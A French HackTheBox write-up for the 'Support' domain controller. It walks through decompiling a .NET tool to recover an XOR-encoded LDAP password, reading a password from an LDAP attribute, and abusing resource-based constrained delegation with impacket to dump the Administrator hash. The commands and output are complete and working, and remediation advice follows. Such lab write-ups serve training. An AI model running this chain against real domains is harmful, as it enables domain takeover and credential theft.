# Support — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Windows Server (contrôleur de domaine) |
| **Difficulté** | 🟢 Easy |
| **Date** | 2026-10-05 |
| **Vecteur** | SMB `support-tools` → reverse `UserInfo.exe` (.NET, XOR) → compte `ldap` → attribut `info` du compte `support` → **RBCD** (GenericWrite sur `DC$`) → ticket Administrator → DC |
| **CVE** | aucune — abus de configuration AD |
| **Tags** | active-directory · smb · ldap · rbcd · delegation |

> `<IP_CIBLE>` = IP de session. Domaine dans `/etc/hosts`.

> 🎯 **Nouveauté à apprendre ici : RBCD (Resource-Based Constrained Delegation).**
> Quand tu as un `GenericAll`/`GenericWrite` sur un **ordinateur** (ou le droit d'écrire son
> `msDS-AllowedToActOnBehalfOfOtherIdentity`), tu peux te faire passer pour **n'importe qui** sur lui, dont l'admin.

---

## TL;DR

Un partage SMB (`support-tools`) contient **`UserInfo.exe`** (.NET). Décompilé (`monodis`/dnSpy), il embarque
les identifiants du compte **`ldap`** : une chaîne Base64 déchiffrée par **XOR clé `armando` + XOR `0xDF`**
→ `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`. Avec `ldap`, je lis l'annuaire : l'attribut **`info`** du compte
**`support`** contient son mot de passe (`Ironside47pleasure40Watchful`) → WinRM (user flag). BloodHound
montre que `support` a **`GenericWrite` sur l'objet `DC$`** → **RBCD** : je crée un compte machine `FAKE$`,
j'écris `msDS-AllowedToActOnBehalfOfOtherIdentity` du DC vers `FAKE$`, je demande un ticket **en impersonant
Administrator** (`getST` → S4U2self+S4U2Proxy), et je l'utilise (`secretsdump -k`) → hash Administrator → DC.

**SMB → reverse `UserInfo.exe` (`ldap`) → attribut `info` (`support`) → RBCD (GenericWrite sur `DC$`) → ticket Administrator → DC.**

---

## 1. Reconnaissance

```bash
┌──(kali㉿kali)-[~/nmap/Support]
└─$ nmap -sC -sV -p- 10.129.114.211                                  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-05 15:31 +0200
Nmap scan report for 10.129.114.211
Host is up (0.047s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-05 13:34:42Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-05T13:35:32
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 291.95 seconds

```

- Domaine / hostname : `support.htb`

---

## 2. Foothold — binaire à analyser → creds LDAP → mot de passe caché

**Méthode (2 temps) :**
1. Un **partage SMB** (type `support-tools`) contient un **exécutable maison** (.NET). Récupère-le et
   **décompile-le** (dnSpy / ILSpy) : il embarque des **identifiants LDAP** (souvent obscurcis/encodés).
2. Avec ces creds LDAP, **interroge l'annuaire** : un compte a un mot de passe planqué dans un **attribut**
   (`info` / `description`).

```bash
┌──(kali㉿kali)-[~/nmap/Support]
└─$ nxc smb 10.129.114.211 -u '' -p '' --shares
SMB         10.129.114.211  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.114.211  445    DC               [+] support.htb\: 
SMB         10.129.114.211  445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED

# récupérer l'exe, le décompiler → creds LDAP
┌──(kali㉿kali)-[~/nmap/Support]
└─$ monodis UserInfo.exe > userinfo.il   
┌──(kali㉿kali)-[~/nmap/Support]
└─$ grep -iE 'ldstr|key' userinfo.il                                               
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 ) // .z\V.4..
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A ) // .?_....:
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 ) // .z\V.4..
          IL_0010:  ldstr "UserInfo.exe"
    .field  private static  unsigned int8[] key
        IL_0016:  ldsfld unsigned int8[] UserInfo.Services.Protected::key
        IL_001c:  ldsfld unsigned int8[] UserInfo.Services.Protected::key
        IL_0000:  ldstr "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
        IL_000f:  ldstr "armando"
        IL_0019:  stsfld unsigned int8[] UserInfo.Services.Protected::key
        IL_000d:  ldstr "LDAP://support.htb"
        IL_0012:  ldstr "support\\ldap"
          IL_0006:  ldstr "[-] At least one of -first or -last is required."
          IL_0018:  ldstr "(givenName="
          IL_001e:  ldstr ")"
          IL_002e:  ldstr "(sn="
          IL_0034:  ldstr ")"
          IL_0049:  ldstr "(&(givenName="
```
```python
import base64
enc = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"
out = bytes(enc[i] ^ key[i % len(key)] ^ 0xDF for i in range(len(enc)))
print(out.decode())
```
```bash
┌──(kali㉿kali)-[~/nmap/Support]
└─$ python3 test.py                 
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

# puis interroger LDAP :
┌──(kali㉿kali)-[~/nmap/Support]
└─$ nxc smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users

SMB         10.129.115.13   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.115.13   445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
SMB         10.129.115.13   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                                                                   
SMB         10.129.115.13   445    DC               Administrator                 2022-07-19 17:55:56 0       Built-in account for administering the computer/domain                                          
SMB         10.129.115.13   445    DC               Guest                         2022-05-28 11:18:55 0       Built-in account for guest access to the computer/domain                                        
SMB         10.129.115.13   445    DC               krbtgt                        2022-05-28 11:03:43 0       Key Distribution Center Service Account                                                         
SMB         10.129.115.13   445    DC               ldap                          2022-05-28 11:11:46 0                                                                                                       
SMB         10.129.115.13   445    DC               support                       2022-05-28 11:12:00 0                                                                                                       
SMB         10.129.115.13   445    DC               smith.rosario                 2022-05-28 11:12:19 0                                                                                                       
SMB         10.129.115.13   445    DC               hernandez.stanley             2022-05-28 11:12:34 0                                                                                                       
SMB         10.129.115.13   445    DC               wilson.shelby                 2022-05-28 11:12:50 0                                                                                                       
SMB         10.129.115.13   445    DC               anderson.damian               2022-05-28 11:13:05 0                                                                                                       
SMB         10.129.115.13   445    DC               thomas.raphael                2022-05-28 11:13:21 0                                                                                                       
SMB         10.129.115.13   445    DC               levine.leopoldo               2022-05-28 11:13:37 0                                                                                                       
SMB         10.129.115.13   445    DC               raven.clifton                 2022-05-28 11:13:53 0                                                                                                       
SMB         10.129.115.13   445    DC               bardot.mary                   2022-05-28 11:14:08 0                                                                                                       
SMB         10.129.115.13   445    DC               cromwell.gerard               2022-05-28 11:14:24 0                                                                                                       
SMB         10.129.115.13   445    DC               monroe.david                  2022-05-28 11:14:39 0                                                                                                       
SMB         10.129.115.13   445    DC               west.laura                    2022-05-28 11:14:55 0                                                                                                       
SMB         10.129.115.13   445    DC               langley.lucy                  2022-05-28 11:15:10 0                                                                                                       
SMB         10.129.115.13   445    DC               daughtler.mabel               2022-05-28 11:15:26 0                                                                                                       
SMB         10.129.115.13   445    DC               stoll.rachelle                2022-05-28 11:15:42 0                                                                                                       
SMB         10.129.115.13   445    DC               ford.victoria                 2022-05-28 11:15:58 0                                                                                                       
SMB         10.129.115.13   445    DC               [*] Enumerated 20 local users: SUPPORT

┌──(kali㉿kali)-[~/nmap/Support]
└─$ ldapsearch -x -H ldap://support.htb -D 'support\ldap' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' '(sAMAccountName=support)' info
# extended LDIF
#
# LDAPv3
# base <DC=support,DC=htb> with scope subtree
# filter: (sAMAccountName=support)
# requesting: info 
#

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
info: Ironside47pleasure40Watchful

# search reference
ref: ldap://ForestDnsZones.support.htb/DC=ForestDnsZones,DC=support,DC=htb

# search reference
ref: ldap://DomainDnsZones.support.htb/DC=DomainDnsZones,DC=support,DC=htb

# search reference
ref: ldap://support.htb/CN=Configuration,DC=support,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3


```

- Creds LDAP extraits du binaire : compte **`ldap`** / `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`
- Mot de passe dans l'attribut `info` → compte **`support`** / `Ironside47pleasure40Watchful`
- Accès : `evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'`

**Flag user :** desktop (non publié).

> Réflexe : un **binaire fourni** est du code à lire (chaînes, décompilation) — les secrets y sont souvent
> encodés, pas chiffrés. Et les **attributs LDAP** (`info`, `description`) sont un nid à mots de passe.

---

## 3. Privesc — RBCD

**Méthode :** BloodHound montre que ton compte a un droit d'écriture (`GenericWrite`/`GenericAll`) sur
l'**objet ordinateur du DC**. Tu exploites la **délégation RBCD** :

```bash
# 1) RE-créer le compte machine (box neuve) — PAS de -no-add, PAS de $ dans le nom
impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' \
  -computer-name 'FAKE' -computer-pass 'Pass123!' -dc-ip 10.129.115.18
#   -> Successfully added machine account FAKE$

# 2) écrire le RBCD sur le DC
impacket-rbcd support.htb/support:'Ironside47pleasure40Watchful' \
  -delegate-to 'DC$' -delegate-from 'FAKE$' -action write -dc-ip 10.129.115.18

# vérifier : msDS-AllowedToAct... doit maintenant contenir FAKE$
impacket-rbcd support.htb/support:'Ironside47pleasure40Watchful' \
  -delegate-to 'DC$' -action read -dc-ip 10.129.115.18

# 3) ticket en impersonant Administrator
impacket-getST support.htb/'FAKE$':'Pass123!' \
  -spn 'cifs/dc.support.htb' -impersonate Administrator -dc-ip 10.129.115.18
#   -> écrit Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache

# 4) utiliser le ticket
export KRB5CCNAME=$(ls -t *.ccache | head -1)

┌──(kali㉿kali)-[~/nmap/Support]
└─$ impacket-secretsdump -k -no-pass dc.support.htb -just-dc-user Administrator             
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f5301f54fad85ba357fb859c94c5c31a6abe61f6db1986c03574bfd6c2e31632
Administrator:aes128-cts-hmac-sha1-96:678dcbcbf92bc72fd318ac4aa06ede64
Administrator:des-cbc-md5:13a8c8abc12f945e
[*] Cleaning up... 

```

- Droit abusé : **`GenericWrite` de `support` sur l'objet ordinateur `DC$`** (vu dans BloodHound).
- Pourquoi ça marche (oral) : le RBCD met dans `msDS-AllowedToActOnBehalfOfOtherIdentity` du **DC** le SID de **`FAKE$`** → le DC accepte que `FAKE$` demande des tickets **« au nom de » n'importe qui**. `getST` enchaîne **S4U2self** (obtenir un ticket Administrator vers FAKE$) puis **S4U2Proxy** (le convertir en ticket de service vers le DC) → j'ai un ticket CIFS Administrator valide sur le DC, sans jamais connaître son mot de passe.

**Flag root :** `C:\Users\Administrator\Desktop\root.txt` (non publié).

> Pass-the-Hash final (alternative au ticket) : `evil-winrm -i dc.support.htb -u Administrator -H bb06cbc02b39abeddd1335bc30b19e26`.

---

## 4. Remédiation

- Ne pas laisser `GenericWrite`/`GenericAll` sur les objets ordinateurs (surtout le DC).
- Restreindre la **création de comptes machine** (`ms-DS-MachineAccountQuota` à 0).
- Surveiller les écritures sur `msDS-AllowedToActOnBehalfOfOtherIdentity`.
- Ne pas embarquer de creds dans les binaires ; nettoyer les attributs LDAP.

---

## 5. Leçons

- <analyser un binaire fourni : chaînes/décompilation, secrets encodés>
- <RBCD : 1re délégation — le mécanisme « agir au nom de »>
- <la chaîne addcomputer → rbcd → getST → PtT>

---

## Références

- Fiches liées : [smb](../outils/smb.md) · [bloodhound](../outils/bloodhound.md) · [ad-attacks](../outils/ad-attacks.md) · [impacket](../outils/impacket.md)
